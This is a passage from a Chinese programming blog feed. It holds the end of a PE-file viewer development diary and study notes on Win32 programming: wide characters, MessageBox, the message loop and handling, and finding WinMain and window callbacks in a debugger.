class="hljs-built_in">sprintf</span>(strBuffer, _T(<span class="hljs-string">&quot;0x%X&quot;</span>), dirHeader[<span class="hljs-number">12</span>].Size);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DIR_IAT_SIZE, strBuffer);<br><span class="hljs-built_in">memset</span>(strBuffer,<span class="hljs-number">0x20</span> ,<span class="hljs-keyword">sizeof</span>(TCHAR));<br><br><span class="hljs-built_in">sprintf</span>(strBuffer, _T(<span class="hljs-string">&quot;0x%X&quot;</span>), dirHeader[<span class="hljs-number">13</span>].Size);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DIR_POSTIMPORT_SIZE, strBuffer);<br><span class="hljs-built_in">memset</span>(strBuffer,<span class="hljs-number">0x20</span> ,<span class="hljs-keyword">sizeof</span>(TCHAR));<br><br><span class="hljs-built_in">sprintf</span>(strBuffer, _T(<span class="hljs-string">&quot;0x%X&quot;</span>), dirHeader[<span class="hljs-number">14</span>].Size);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DIR_COM_SIZE, strBuffer);<br><span class="hljs-built_in">memset</span>(strBuffer,<span class="hljs-number">0x20</span> ,<span class="hljs-keyword">sizeof</span>(TCHAR));<br><br><span class="hljs-built_in">sprintf</span>(strBuffer, _T(<span class="hljs-string">&quot;0x%X&quot;</span>), dirHeader[<span class="hljs-number">15</span>].Size);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DIR_RESERVE_SIZE, strBuffer);<br><span class="hljs-built_in">memset</span>(strBuffer,<span class="hljs-number">0x20</span> ,<span class="hljs-keyword">sizeof</span>(TCHAR));<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来还需要给处理几个按钮的逻辑，以便查看诸如导入表和导出表之类的重要表的详细信息。六个按钮调出的对话框使用的是同一个消息处理函数DirDetailDialogProc。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL CALLBACK <span class="hljs-title function_">DirDetailDialogProc</span><span class="hljs-params">(</span><br><span class="hljs-params">HWND hwndDlg,  <span class="hljs-comment">// handle to dialog box</span></span><br><span class="hljs-params">UINT uMsg,     <span class="hljs-comment">// message</span></span><br><span class="hljs-params">WPARAM wParam, <span class="hljs-comment">// first message parameter</span></span><br><span class="hljs-params">LPARAM lParam  <span class="hljs-comment">// second message parameter</span></span><br><span class="hljs-params">)</span><br>&#123;<br><span class="hljs-keyword">switch</span>(uMsg)<br>&#123;<br><span class="hljs-keyword">case</span>  WM_INITDIALOG :<br>&#123;<br><span class="hljs-keyword">switch</span>(detailDirNum)<br>&#123;<br><br><span class="hljs-keyword">case</span> IMPORT_DETAIL:<br>&#123;<br>LPSTR detail = GetImport(szFileName);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DETAIL, detail);<br><span class="hljs-keyword">return</span> TRUE ;<br>&#125;<br><span class="hljs-keyword">case</span> EXPORT_DETAIL:<br>&#123;<br>LPSTR detail = GetExport(szFileName);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DETAIL, detail);<br><span class="hljs-keyword">return</span> TRUE ;<br>&#125;<br><span class="hljs-keyword">case</span> RESOURCE_DETAIL:<br>&#123;<br>LPSTR detail = GetResource(szFileName);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DETAIL, detail);<br><span class="hljs-keyword">return</span> TRUE ;<br>&#125;<br><span class="hljs-keyword">case</span> RELOCATION_DETAIL:<br>&#123;<br>LPSTR detail = GetRelocation(szFileName);<br>SetDlgItemText(hwndDlg,IDC_EDIT_DETAIL, detail);<br><span class="hljs-keyword">return</span> TRUE ;<br>&#125;<br><br>&#125;<br><br>&#125;<br><br><span class="hljs-keyword">case</span> WM_CLOSE:<br>&#123;<br>EndDialog(hwndDlg, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里用上了之前解析PE文件时的代码。</p><p>最终完成的效果如下：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/PE%20Tool%20%E5%BC%80%E5%8F%91%E6%97%A5%E8%AE%B0%203%20-%20Directory%E8%A7%A3%E6%9E%90.assets/image-20220110215915612.png" alt="image-20220110215915612"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/PE%20Tool%20%E5%BC%80%E5%8F%91%E6%97%A5%E8%AE%B0%203%20-%20Directory%E8%A7%A3%E6%9E%90.assets/image-20220110215934533.png" alt="image-20220110215934533"></p><p>本节难度不高，主要是一个个在Edit Control控件中输入数据耗费了较多时间。</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>滴水学习</category>
      
      <category>项目开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>Win32</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>滴水初级-Win32笔记</title>
    <link href="/2022/02/20/%E4%BA%8C%E8%BF%9B%E5%88%B6/Win32/"/>
    <url>/2022/02/20/%E4%BA%8C%E8%BF%9B%E5%88%B6/Win32/</url>
    
    <content type="html"><![CDATA[<h1 id="宽字符"><a href="#宽字符" class="headerlink" title="宽字符"></a>宽字符</h1><h2 id="C语言中的宽字符"><a href="#C语言中的宽字符" class="headerlink" title="C语言中的宽字符"></a>C语言中的宽字符</h2><p>在C语言中如何使用上一章所述的编码格式表示字符串。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">ASCII码：char strBuff[] <span class="hljs-operator">=</span> <span class="hljs-string">&quot;中国&quot;</span><span class="hljs-comment">;</span><br>Unicode编码（UTF-<span class="hljs-number">16</span>）：wchar_t strBuff[] <span class="hljs-operator">=</span> L<span class="hljs-string">&quot;中国&quot;</span><span class="hljs-comment">; // 这里需要在双引号</span><br></code></pre></td></tr></table></figure><p>之前加上L是因为如果你不加的话，编译器会默认使用当前文件的编码格式去存储，所以我们需要加上。（注意使用这个的时候需要包含stdio.h这个头文件）</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-17_1-27-44.png" alt="images/download/attachments/12714992/image2021-5-17_1-27-44.png"></p><p><strong>Unicode编码这种表现形式实际上就是宽字符，所以在提起宽字符的时候我们就应该想到这种方式。</strong></p><p>ASCII编码和Unicode编码在内存中的存储方式不一样，所以我们使用相关函数的时候也要注意，如下图所示，ASCII编码使用左边的，而Unicode则是右边的：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-17_1-12-0.png" alt="images/download/attachments/12714992/image2021-5-17_1-12-0.png"></p><p>例如我们想要在控制台中打印一个宽字符的字符串：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-17_1-18-46.png" alt="images/download/attachments/12714992/image2021-5-17_1-18-46.png"></p><p>再一个例子就是字符串的长度：</p><p>char strBuff[] &#x3D; “China”;</p><p>wchar_t strBuff1[] &#x3D; L”China”;</p><p>strlen(strBuff); &#x2F;&#x2F;取得多字节字符串中字符长度，不包含 00</p><p>wcslen(strBuff1); &#x2F;&#x2F;取得多字节字符串中字符长度，不包含 00 00</p><h2 id="Win32-API中的宽字符"><a href="#Win32-API中的宽字符" class="headerlink" title="Win32 API中的宽字符"></a>Win32 API中的宽字符</h2><h3 id="了解什么是Win32-API"><a href="#了解什么是Win32-API" class="headerlink" title="了解什么是Win32 API"></a>了解什么是Win32 API</h3><p>Win32 API就是Windows操作系统提供给我们的函数（应用程序接口），其主要存放在C:\Windows\System32（存储的DLL是64位）、C:\Windows\SysWOW64（存储的DLL是32位）下面的所有DLL文件（几千个）。</p><p>重要的DLL文件：</p><ol><li>Kernel32.dll：最核心的功能模块，例如内存管理、进程线程相关的函数等；</li><li>User32.dll：Windows用户界面相关的应用程序接口，例如创建窗口、发送信息等；</li><li>GDI32.dll：全称是Graphical Device Interface（图形设备接口），包含用于画图和显示文本的函数。</li></ol><p>在C语言中我们想要使用Win32 API的话直接在代码中包含windows.h这个头文件即可。</p><p>比如我们想要弹出一个提示窗口，Win32 API文档中弹窗API的格式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">MessageBox</span><span class="hljs-params">(</span><br><span class="hljs-params">    HWND hWnd,          <span class="hljs-comment">// handle to owner window</span></span><br><span class="hljs-params">    LPCTSTR lpText,     <span class="hljs-comment">// text in message box</span></span><br><span class="hljs-params">    LPCTSTR lpCaption,  <span class="hljs-comment">// message box title</span></span><br><span class="hljs-params">    UINT uType          <span class="hljs-comment">// message box style</span></span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><p>这个代码可能看起来非常可怕，好像我们都没有接触过，<strong>但实际上其不是什么新的类型，所谓的新的类型无非就是给原有的类型重新起了一个名字，这样做是为了将所有类型统一化，便于读写，如果涉及到跨平台的话将原来的类型修改一下就好了，无需对代码进行重写</strong>。</p><p>例如以上代码中的类型LPCTSTR，实际上我们跟进一下代码（选中F12）会发现其本质就是const char *这个类型，只不过是换了一个名字罢了。</p><p>常用的数据类型在Win32中都重新起了名字：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-17_1-43-48.png" alt="images/download/attachments/12714992/image2021-5-17_1-43-48.png"></p><h3 id="在Win32中使用字符串"><a href="#在Win32中使用字符串" class="headerlink" title="在Win32中使用字符串"></a>在Win32中使用字符串</h3><p>字符类型：</p><p>CHAR strBuff[] &#x3D; “中国”; &#x2F;&#x2F; char</p><p>WCHAR strBuff[] &#x3D; L”中国”; &#x2F;&#x2F; wchar_t</p><p>TCHAR strBuff[] &#x3D; TEXT(“中国”); &#x2F;&#x2F; TCHAR 根据当前项目的编码自动选择char还是wchar_t，在Win32中推荐使用这种方式</p><p>字符串指针:</p><p>PSTR strPoint &#x3D; “中国”; &#x2F;&#x2F; char*</p><p>PWSTR strPoint &#x3D; L”中国”; &#x2F;&#x2F; wchar_t*</p><p>PTSTR strPoint &#x3D; TEXT(“中国”); &#x2F;&#x2F; PTSTR 根据当前项目的编码自动选择如char<em>还是wchar_t</em>，在Win32中推荐使用这种方式</p><h3 id="各种版本的MessageBox"><a href="#各种版本的MessageBox" class="headerlink" title="各种版本的MessageBox"></a>各种版本的MessageBox</h3><p>MessageBox，其实际上本质就是MessageBoxW和MessageBoxA：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-17_1-51-13-16448896292451.png" alt="images/download/attachments/12714992/image2021-5-17_1-51-13.png"></p><p>MessageBoxA只接受ASCII编码的参数，而MessageBoxW则只接受Unicode编码的参数。</p><p>从本质上来讲，Windows字符串都是宽字符的，所以<strong>使用MessageBoxW这种方式性能会更好一些</strong>，因为当你使用MessageBoxA的时候，在到内核的时候（系统底层）其会转化Unicode，所以性能相对差一些。</p><p>弹框调用如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">CHAR strTitle[] = <span class="hljs-string">&quot;Title&quot;</span>;<br>CHAR strContent[] = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>MessageBoxA(<span class="hljs-number">0</span>, strContent, strTitle, MB_OK);<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">WCHAR strTitle[] = <span class="hljs-string">L&quot;Title&quot;</span>;<br>WCHAR strContent[] = <span class="hljs-string">L&quot;Hello World!&quot;</span>;<br>MessageBoxW(<span class="hljs-number">0</span>, strContent, strTitle, MB_OK);<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">TCHAR strTitle[] = TEXT(<span class="hljs-string">&quot;Title&quot;</span>);<br>TCHAR strContent[] = TEXT(<span class="hljs-string">&quot;Hello World!&quot;</span>);<br>MessageBox(<span class="hljs-number">0</span>, strContent, strTitle, MB_OK);<br></code></pre></td></tr></table></figure><h1 id="消息机制"><a href="#消息机制" class="headerlink" title="消息机制"></a>消息机制</h1><h2 id="什么是消息"><a href="#什么是消息" class="headerlink" title="什么是消息"></a>什么是消息</h2><p>当我们点击鼠标的时候，或者当我们按下键盘的时候，操作系统都要把这些动作记录下来，封装到一个结构体中，这个<strong>结构体</strong>就是消息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tagMSG</span> &#123;</span><br>  HWND   hwnd;      <span class="hljs-comment">// 所属窗口句柄</span><br>  UINT   message;   <span class="hljs-comment">// 消息类型：编号</span><br>  WPARAM wParam;    <span class="hljs-comment">// 附加数据，进一步描述消息的</span><br>  LPARAM lParam;    <span class="hljs-comment">// 附加数据，进一步描述消息的</span><br>  DWORD  time;      <span class="hljs-comment">// 消息产生的时间</span><br>  POINT  pt;        <span class="hljs-comment">// 在哪里产生的</span><br>&#125; MSG, *PMSG; <br></code></pre></td></tr></table></figure><h2 id="消息的产生与处理流程"><a href="#消息的产生与处理流程" class="headerlink" title="消息的产生与处理流程"></a>消息的产生与处理流程</h2><p>从消息发起这个点开始说，假设我们点击了某个窗口时就会产生一个消息，操作系统得到这个消息后先判断当前点击的是哪个窗口，找到对应的窗口对象，再根据窗口对象的里的某一个成员找到对应线程，一旦找到了对应线程，操作系统就会把封装好的消息（这是一个结构体，包含了你鼠标点击的坐标等等消息）存到对应的消息队列里，应用程序就会通过GetMessage不停的从消息队列中取消息。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-6-1_14-46-15.png" alt="images/download/attachments/12714992/image2021-6-1_14-46-15.png"></p><p>能产生消息的情况有四种情况：<strong>1. 键盘 2. 鼠标 3. 其他应用程序 4. 操作系统内核程序</strong>，有这么多消息要处理，所以操作系统会将所有消息区分类别，每个消息都有独一无二的编号。</p><p>消息这个结构体存储的信息也不多，只能知道消息属于哪个窗口，根本不知道对应窗口函数是什么，所以我们不得不在之后对消息进行分发（DispatchMessage函数），而后由内核发起调用来执行窗口函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">LRESULT CALLBACK <span class="hljs-title function_">WindowProc</span><span class="hljs-params">(  </span><br><span class="hljs-params">IN  HWND hwnd,  </span><br><span class="hljs-params">IN  UINT uMsg,  </span><br><span class="hljs-params">IN  WPARAM wParam,  </span><br><span class="hljs-params">IN  LPARAM lParam  </span><br><span class="hljs-params">)</span>;  <br></code></pre></td></tr></table></figure><p>换而言之，我们这个消息的结构体实际上就是<strong>传递给了窗口函数</strong>，<strong>其四个参数对应着消息结构体的前四个成员</strong>。</p><h2 id="消息队列"><a href="#消息队列" class="headerlink" title="消息队列"></a>消息队列</h2><p>每个线程只有一个消息队列。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-28_21-47-51.png" alt="images/download/attachments/12714992/image2021-5-28_21-47-51.png"></p><h2 id="消息类型"><a href="#消息类型" class="headerlink" title="消息类型"></a>消息类型</h2><p>我们想要关注自己想要关注的消息类型，首先可以在窗口函数中打印消息类型来看看都有什么消息类型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 窗口函数定义</span><br>LRESULT CALLBACK <span class="hljs-title function_">WindowProc</span><span class="hljs-params">(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span> &#123;<br>    <span class="hljs-type">char</span> szOutBuff[<span class="hljs-number">0x80</span>];<br>    <span class="hljs-built_in">sprintf</span>(szOutBuff, <span class="hljs-string">&quot;Message: %x - %x \n&quot;</span>, hwnd, uMsg);<br>    OutputDebugString(szOutBuff);<br>    <span class="hljs-comment">// 必须要调用一个默认的消息处理函数，关闭、最小化、最大化都是由默认消息处理函数处理的</span><br>    <span class="hljs-keyword">return</span> DefWindowProc(hwnd, uMsg, wParam, lParam);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-6-1_23-41-40.png" alt="images/download/attachments/12714992/image2021-6-1_23-41-40.png"></p><p>可以看见这边输出了一个0x1，想要知道这个对应着什么，我们可以在<strong>C:\Program Files\Microsoft Visual Studio\VC98\Include</strong>目录中找到<strong>WINUSER.H</strong>这个文件来查看，搜索0x0001就可以找到：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-6-1_23-46-11.png" alt="images/download/attachments/12714992/image2021-6-1_23-46-11.png"></p><p>那么我们可以看见对应的宏就是<strong>WM_CREATE</strong>，这个消息的意思就是窗口创建，所以我们有很多消息是不需要关注的，而且消息时刻都在产生，非常非常多。</p><h3 id="处理窗口关闭"><a href="#处理窗口关闭" class="headerlink" title="处理窗口关闭"></a>处理窗口关闭</h3><p>在窗口关闭时，实际上进程并不会关闭，所以我们需要在窗口函数中筛选条件，当窗口关闭了就退出进程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 窗口函数定义</span><br>LRESULT CALLBACK <span class="hljs-title function_">WindowProc</span><span class="hljs-params">(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span> &#123;<br>    <span class="hljs-keyword">switch</span>(uMsg) &#123;<br>    <span class="hljs-comment">// 当窗口关闭则退出进程</span><br>    <span class="hljs-keyword">case</span> WM_DESTROY:<br>        &#123;<br>            PostQuitMessage(<span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">    <span class="hljs-comment">// 必须要调用一个默认的消息处理函数，关闭、最小化、最大化都是由默认消息处理函数处理的</span><br>    return <span class="hljs-constructor">DefWindowProc(<span class="hljs-params">hwnd</span>, <span class="hljs-params">uMsg</span>, <span class="hljs-params">wParam</span>, <span class="hljs-params">lParam</span>)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="处理键盘按下"><a href="#处理键盘按下" class="headerlink" title="处理键盘按下"></a>处理键盘按下</h3><p>我们除了可以处理窗口关闭，处理键盘按下也是没问题的，键盘按下的宏是WM_KEYDOWN，但是我们想要按下a这个键之后才处理该怎么办？首先我们需要查阅一下MSDN Library：</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs hsp">LRESULT CALLBACK WindowProc(<br>  <span class="hljs-keyword">HWND</span> <span class="hljs-keyword">hwnd</span>,       <span class="hljs-comment">// handle to window</span><br>  UINT uMsg,       <span class="hljs-comment">// WM_KEYDOWN</span><br>  <span class="hljs-keyword">WPARAM</span> <span class="hljs-keyword">wParam</span>,   <span class="hljs-comment">// virtual-key code</span><br>  <span class="hljs-keyword">LPARAM</span> <span class="hljs-keyword">lParam</span>    <span class="hljs-comment">// key data</span><br>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>可以很清楚的看见窗口函数的第三个参数就是虚拟键码（键盘上每个键都对应一个虚拟键码），我们可以输出下按下a，其对应虚拟键码是什么：</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs hsp"><span class="hljs-comment">// 窗口函数定义</span><br>LRESULT CALLBACK WindowProc(<span class="hljs-keyword">HWND</span> <span class="hljs-keyword">hwnd</span>, UINT uMsg, <span class="hljs-keyword">WPARAM</span> <span class="hljs-keyword">wParam</span>, <span class="hljs-keyword">LPARAM</span> <span class="hljs-keyword">lParam</span>) &#123;<br>    <span class="hljs-keyword">switch</span>(uMsg) &#123;<br>    <span class="hljs-comment">// 当键盘按下则处理</span><br>    <span class="hljs-keyword">case</span> WM_KEYDOWN:<br>        &#123;<br>            char szOutBuff[<span class="hljs-number">0</span>x80]<span class="hljs-comment">;</span><br>            sprintf(szOutBuff, <span class="hljs-string">&quot;keycode: %x \n&quot;</span>, <span class="hljs-keyword">wParam</span>)<span class="hljs-comment">;</span><br>            OutputDebugString(szOutBuff)<span class="hljs-comment">;</span><br>            <span class="hljs-keyword">break</span><span class="hljs-comment">;</span><br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">    <span class="hljs-comment">// 必须要调用一个默认的消息处理函数，关闭、最小化、最大化都是由默认消息处理函数处理的</span><br>    return <span class="hljs-constructor">DefWindowProc(<span class="hljs-params">hwnd</span>, <span class="hljs-params">uMsg</span>, <span class="hljs-params">wParam</span>, <span class="hljs-params">lParam</span>)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-6-2_0-10-19.png" alt="images/download/attachments/12714992/image2021-6-2_0-10-19.png"></p><p>如上图所示，按下a之后输出的虚拟键码是0x41，所以我们可以根据这个来进行判断。</p><h2 id="转换消息"><a href="#转换消息" class="headerlink" title="转换消息"></a>转换消息</h2><p>之前我们举例可以处理键盘按下的消息，但是我们想要直观的看到底输入了什么而不是虚拟键码该怎么办？这时候我们就需要使用WM_CHAR这个宏了，但是在这之前，我们的消息是必须要经过转换的，只有其转换了，我们的虚拟键码才能变成具体的字符。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-6-2_0-17-29.png" alt="images/download/attachments/12714992/image2021-6-2_0-17-29.png"></p><p>WM_CHAR宏对应的窗口函数参数作用如下：</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs hsp">LRESULT CALLBACK WindowProc(<br>  <span class="hljs-keyword">HWND</span> <span class="hljs-keyword">hwnd</span>,       <span class="hljs-comment">// handle to window</span><br>  UINT uMsg,       <span class="hljs-comment">// WM_CHAR</span><br>  <span class="hljs-keyword">WPARAM</span> <span class="hljs-keyword">wParam</span>,   <span class="hljs-comment">// character code (TCHAR)</span><br>  <span class="hljs-keyword">LPARAM</span> <span class="hljs-keyword">lParam</span>    <span class="hljs-comment">// key data</span><br>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>第三个参数就是字符所以我们直接输出这个即可：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-6-2_0-16-57.png" alt="images/download/attachments/12714992/image2021-6-2_0-16-57.png"></p><h2 id="窗口与线程"><a href="#窗口与线程" class="headerlink" title="窗口与线程"></a>窗口与线程</h2><p>当我们把鼠标点击左边窗口关闭按钮，为什么它会关闭，这个关闭（坐标、左右键…）操作系统会封装到结构体里（消息），那么这个消息如何精确的传递给对应进程的线程呢？</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-28_21-52-48.png" alt="images/download/attachments/12714992/image2021-5-28_21-52-48.png"></p><p>那是因为操作系统可以将坐标之类的作为索引，去找到对应的窗口，窗口在内核中是有窗口对象的，而这个窗口对象就会包含一个成员，这个成员就是线程对象的指针，线程又包含了消息，所以这样一个顺序就很容易理解了。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image2021-5-28_21-57-18.png" alt="images/download/attachments/12714992/image2021-5-28_21-57-18.png"></p><p>注意：一个线程可以有多个窗口，但是一个窗口只属于一个线程。</p><h2 id="消息堆栈"><a href="#消息堆栈" class="headerlink" title="消息堆栈"></a>消息堆栈</h2><p>调用消息处理函数（WinProc）形成的栈帧如下所示，这里假定使用ESP寻址方式：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image-20211230104130403.png" alt="image-20211230104130403"></p><p>如上可以看到，ESP+8就是我们需要的消息类型参数，基于此可以条件断点（消息断点）便于我们调试。</p><h2 id="调试流程"><a href="#调试流程" class="headerlink" title="调试流程"></a>调试流程</h2><h3 id="Win32应用程序入口识别"><a href="#Win32应用程序入口识别" class="headerlink" title="Win32应用程序入口识别"></a>Win32应用程序入口识别</h3><p>还记得WinMain这个入口函数长什么样吗，它的特征是会有四个参数。也就是在反汇编调试的时候会对应着四个PUSH。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> APIENTRY <span class="hljs-title function_">WinMain</span><span class="hljs-params">(HINSTANCE hInstance,</span><br><span class="hljs-params">                     HINSTANCE hPrevInstance,</span><br><span class="hljs-params">                     LPSTR     lpCmdLine,</span><br><span class="hljs-params">                     <span class="hljs-type">int</span>       nCmdShow)</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image-20211229105030199.png" alt="image-20211229105030199"></p><p>其中还有一个PUSH是GetModuleHandle函数的返回值（存在EAX）里，这些都是WinMain函数的特征。</p><h3 id="窗口回调函数的定位"><a href="#窗口回调函数的定位" class="headerlink" title="窗口回调函数的定位"></a>窗口回调函数的定位</h3><p>在定位到WinMain函数后，我们可以进一步定位到RegisterClass函数：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image-20211229105453841.png" alt="image-20211229105453841"></p><p>通过该函数我们可以找到我们定义的WNDCLASS结构体，进而拿到消息处理函数的地址：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image-20211229105637846.png" alt="image-20211229105637846"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image-20211229105707544.png" alt="image-20211229105707544"></p><h3 id="具体事件的处理的定位"><a href="#具体事件的处理的定位" class="headerlink" title="具体事件的处理的定位"></a>具体事件的处理的定位</h3><p>Windows的消息是多种多样的，我们需要快速筛选出我们需要关注的消息。这个可以通过条件断点来实现，在401120处打上断点，在断点界面输入相应的条件即可完成筛选：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image-20211229105926271.png" alt="image-20211229105926271"></p><h3 id="含有子窗口的回调函数的定位"><a href="#含有子窗口的回调函数的定位" class="headerlink" title="含有子窗口的回调函数的定位"></a>含有子窗口的回调函数的定位</h3><p>以按钮为例，按钮是一个特殊的子窗口，它的回调函数是由操作系统提供的。当我们点击按钮时，将按下图所示进行处理：</p><pre><code class=" mermaid">graph 